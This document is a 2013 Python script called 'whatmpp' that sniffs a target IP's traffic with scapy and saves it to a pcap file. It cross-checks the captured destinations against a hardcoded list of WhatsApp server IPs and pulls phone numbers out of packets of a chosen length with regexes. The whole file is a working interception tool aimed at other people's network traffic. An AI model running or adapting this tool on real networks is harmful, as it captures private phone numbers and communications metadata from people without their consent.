#!/usr/bin/env python

# whatmpp -- Sniff and regex Phone Number from WhatsApp packets
# Copyright (C) <2013>  mad_dev(A'mmer Almadani)
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#    * Redistributions of source code must retain the above copyright
#      notice, this list of conditions and the following disclaimer.
#    * Redistributions in binary form must reproduce the above copyright
#      notice, this list of conditions and the following disclaimer in the
#      documentation and/or other materials provided with the distribution.
#    * Neither the name of the <organization> nor the
#      names of its contributors may be used to endorse or promote products
#      derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY
# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

# Report any issues with this script to <mad_dev[at]linuxmail[dot]org>
#								     OR <ammer.almadani[at]sysbase.org[dot]org>

from scapy.all import *
import sys
import os
import argparse
import datetime

YEL = '\033[93m'
ENDC = '\033[0m'
MOV = '\033[96m'
GREEN = '\033[92m'
RED = '\033[91m'


ip_set = ["173.193.247.211",
"184.173.136.73",
"184.173.136.75",
"184.173.136.75",
"184.173.136.80",
"184.173.161.179",
"184.173.161.181",
"184.173.161.184",
"184.173.179.34",
"184.173.179.35",
"50.22.231.37",
"50.22.231.40",
"50.22.231.42",
"50.22.231.45",
"50.22.231.48",
"50.22.231.51",
"50.22.231.53",
"50.22.231.56",
"50.22.231.59",
"50.22.231.41",
"50.22.210.145",
"50.22.235.127",
"208.43.244.175",
"208.43.244.170",
"184.173.136.82",
"184.173.136.87",
"184.172.19.95",
"208.43.96.4",
"50.22.210.132",
"50.22.227.222",
"173.192.219.131",
"173.192.219.140",
"173.193.247.205",
"173.193.247.209",
"173.193.247.213",
"173.192.219.136"] # Thanks to Thijs Alkemade // The list is not conclusive //
                   # You may need to update it

ip_log = 'IP_log'



def sniff_from_src(iface_, proto_, ip_, count_):

	fil = "'" + proto_ + ' and host ' + ip_ + "'" # e.g: icmp and host 192.168.1.1

	UI = YEL + 'IP: ' + MOV + ip_
	UI += YEL + "\nINTERFACE: " + MOV + iface_
	UI += 	YEL + '\nPROTOCOL: ' + MOV + proto_
	UI += 	YEL + '\nCOUNT: ' + MOV + str(count_)
	print UI + ENDC

	if count_ > 1000:
		print GREEN + 'Please Wait...\n' + MOV + str(count_) + YEL + ' Packets Could Take Some Time' + ENDC
	elif count_ <= 1000:
		print GREEN + 'Please Wait...' + ENDC
	cmd = sniff(iface=iface_, filter=str(fil), count=count_) #ip filter
	#cmd = sniff(iface=iface_, count=count_) # whole network

	#print YEL + '\nSUMMARY: ' + MOV
	#cmd.summary() #unComment this if you want a summary // cap file saved, no need for summary
	#print ENDC

	#Write filtered output to file
	log = open(ip_log,'w')
	default = sys.stdout
	sys.stdout = log 

	'''The output from the function will be stored in IP_log and read by check_from_ip_set()'''

	#cmd.summary(lambda x:x.sprintf("{IP:%IP.src% | %IP.dst%\n}")) # from -> to
	#cmd.summary(lambda x:x.sprintf("{IP:%IP.dst% %IP.dport%}")) # to toPort
	cmd.summary(lambda x:x.sprintf("{IP:%IP.dst%}")) # to

	sys.stdout=default
	print GREEN + 'IP List Saved::' + YEL + ip_log + ENDC
	log.close()

	#Save transmission to PCAP format
	wrpcap(pcap, cmd)
	print GREEN + 'Pcap File Saved::'+YEL+pcap+ENDC

def check_from_ip_set(ip_log):
	## 
	for ip in ip_set:
		search_str = ip
		if search_str in open(ip_log).read():
			print YEL + ip + MOV + ' ->  Present'+ ENDC
		else:
			print ip + RED + '  Not Present' + ENDC

#def start_shark(fcap):
#	os.system('sudo wireshark -r '+ fcap)

def get_number_from_pcap(pcap, length, count_):
	## Load Pcap
	load_pcap=rdpcap(pcap)
	for r in range(count_):			#Go through all the packets
		try:
			while len(load_pcap[r]) == length:	
				summ = r
				print YEL + '\nPacket::' + MOV + str(summ) + YEL + '::Length::' + MOV + str(length) + ENDC 
				print YEL + 'Summary::' + MOV + str(load_pcap[r].summary()) + ENDC
				inst = load_pcap[r].load
				esc = re.split('[\W]+[^9]', inst)
				reg = re.compile("[0-9]+[^9]")
				number = reg.findall(str(esc))
				for i in number:
					ii = i
				reg2 = re.split("['-]", str(ii))
				for iii in reg2:
					if len(iii) > 5:
						print YEL + 'Phone Number::' + MOV + str(iii) + ENDC
						return str(iii)
				break
		except:
			pass
			 
		#sys.exit(0)


if __name__ == '__main__':
	
	par = argparse.ArgumentParser(prog='./whatmpp', formatter_class=argparse.ArgumentDefaultsHelpFormatter, 
		epilog="\033[92mThe whatsapp IP-list at line 17 is not conclusive. You may need to update it.\033[0m")
	par.add_argument('-t',  required=True, help="IP of Target", metavar='ip_address')
	par.add_argument('-i',  default='eth0', help="Interface: i.e. eth0, ppp0, wifi0...", metavar='interface')
	par.add_argument('-p',  default='tcp', help="Protocol: TCP, UDP, ICMP, Other", metavar='protocol')
	par.add_argument('-c',  required=True, type=int, help="Number of Packets to Intercept", metavar='packets')
	par.add_argument('-pL', default=190, type=int, help="Length of The Packet to Regex", metavar='len(packet)')
	argv = par.parse_args()

	target_ip = argv.t
	iface_ = argv.i
	proto_ = argv.p
	count_ = argv.c #Number of packets
	length = argv.pL #Length of packet to regex(verb)

	timestamp = datetime.datetime.now().strftime("%d-%m-%Y_%H:%M:%S")
	pcap = 'pcap/' + str(target_ip) + '_' + str(timestamp) + '.cap'

	sniff_from_src(iface_, proto_, target_ip, count_)	
	
	#Opt for list check //
	#Check if an IP from WhatsApp Inc. was accessed
	print YEL
	check = raw_input('Cross Reference IP List with Packets? y/n ')
	print ENDC
	if check == 'y':
		check_from_ip_set(ip_log)
	elif check == 'n':
		pass

	#Opt for Wireshark inspection of Packets
	#print YEL
	#wire = raw_input('View Packets in Wireshark? y/n ')
	#print ENDC
	#if wire == 'y':
	#	start_shark(pcap)
	#elif wire == 'n':
	#	pass

	#Opt for regex-ing phone number
	print YEL
	wire = raw_input('Find Numbers? y/n ')
	print MOV + 'If none are present, there will be no output'
	print ENDC
	if wire == 'y':
		ph = get_number_from_pcap(pcap, 190, count_)
	elif wire == 'n':
		pass

	sys.exit(0)



